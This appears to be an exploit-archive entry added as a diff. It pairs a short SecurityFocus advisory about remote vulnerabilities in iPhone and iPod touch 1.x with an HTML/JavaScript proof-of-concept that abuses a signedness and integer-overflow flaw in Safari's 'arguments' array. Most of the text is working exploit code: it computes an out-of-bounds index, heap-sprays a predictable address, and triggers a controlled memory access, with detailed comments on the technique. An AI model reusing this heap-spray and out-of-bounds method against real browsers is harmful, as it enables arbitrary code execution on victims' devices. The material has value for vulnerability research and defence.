@@ -1,0 +1,74 @@
+source: http://www.securityfocus.com/bid/30186/info
+
+Apple iPhone and iPod touch are prone to multiple remote vulnerabilities:
+
+1. A vulnerability that may allow users to spoof websites.
+2. An information-disclosure vulnerability.
+3. A buffer-overflow vulnerability.
+4. Two memory-corruption vulnerabilities.
+
+Successfully exploiting these issues may allow attackers to execute arbitrary code, crash the affected application, obtain sensitive information, or direct unsuspecting victims to a spoofed site; other attacks are also possible.
+
+These issues affect iPhone 1.0 through 1.1.4 and iPod touch 1.1 through 1.1.4. 
+
+<BODY>
+        <SCRIPT src="HeapSpray2.js"></SCRIPT>
+        <CODE id="sploit status"></CODE>
+        <CODE id="heapspray status"></CODE>
+        <SCRIPT>
+                // The index for the "arguments" array in a JavaScript function in
+                // Safari suffers from a signedness issue that allows access to elements
+                // that are out of bounds. The index is cast to a signed value before it
+                // is compared to the length of the array to check if it within the
+                // bounds. Integer values larger than 0x8000,0000 will be cast to a
+                // negative value and because they are always smaller then the length,
+                // they are treated as a valid index.
+                // The index into the arguments array ends up in instructions
+                // that multiply it by 4 to access data in an array of 32 bit values.
+                // There are no checks for overflows in this calculation. This allows us
+                // to cause it to access anything in memory:
+                //     Pointer to object = base address + 4 * index
+                // The base address varies only slightly and is normally about
+                // 0x7FEx,xxxx. If we create a heap chunk of 0x0100,0000 bytes at a
+                // predictable location using heap spraying, we can then calculate an
+                // index that will access this memory.
+                var iBase = 0x7fe91e6c; // Random sample - value varies but not a lot.
+                var iTargetArea = 0x10000000;
+                // Be advised that heap spraying is "upside down" in Safari: strings
+                // are allocated at high addresses first and as the heap grows, the
+                // addresses go down. The heap will therefor grow in between a lot of
+                // DLLs which reside in this area of the address space as well.
+                // We&#039;ll need to find an area of memory to spray that is not likely to
+                // contain a DLL and easy to reach.
+                var iTargetAddress = 0x55555555;
+                //     iTargetAddress(~0x5555,5555) = iBase(~0x7FEx,xxxx) + 4 * iIndex
+                // 4 * iIndex = (iTargetAddress - iBase) (optionally + 0x1,0000,0000 because an integer overflow is needed)
+                var iRequiredMultiplicationResult = iTargetAddress - iBase + (iTargetAddress < iBase ? 0x100000000 : 0)
+                // iIndex = (iTargetAddress - iBase) / 4
+                var iIndex = Math.floor(iRequiredMultiplicationResult / 4)
+                // We need to trigger the signedness issue so the index must be larger
+                // then 0x8000,0000. Because of the integer overflow in the
+                // multiplication, we can safely add 0x4000,0000 as often as we want;
+                // the multiplication will remove it from the result.
+                while (iIndex < 0x80000000) iIndex += 0x40000000
+                document.getElementById("sploit status").innerHTML = (
+                        "iBase + 4 * iIndex = " +
+                        "0x" + iBase.toString(16, 8) + " + 4 * " + iIndex.toString(16, 8) + " = " +
+                        "0x" + (iBase + 4 * iIndex).toString(16, 8) + "<BR>"
+                );
+                // Set up heap spray
+                var oHeapSpray = new HeapSpray2(iTargetAddress, DWORD(0xDEADBEEF))
+                oHeapSpray.oOutputElement = document.getElementById("heapspray status")
+                // Spray heap asynchronously and call sploit when done.
+                oHeapSpray.spray(sploit)
+                function sploit(oHeapSpray) {
+                        // This will cause an access violation using the value 0xDEADBEEF,
+                        // which comes from the strings we sprayed the heap with.
+                        // 6aa3d57f 8b4f0c          mov     ecx,dword ptr [edi+0Ch] ds:0023:deadbefb=????????
+                        arguments[iIndex];
+                }
+                function DWORD(iValue) {
+                        return String.fromCharCode(iValue & 0xFFFF, iValue >> 16)
+                }
+        </SCRIPT>
+</BODY>
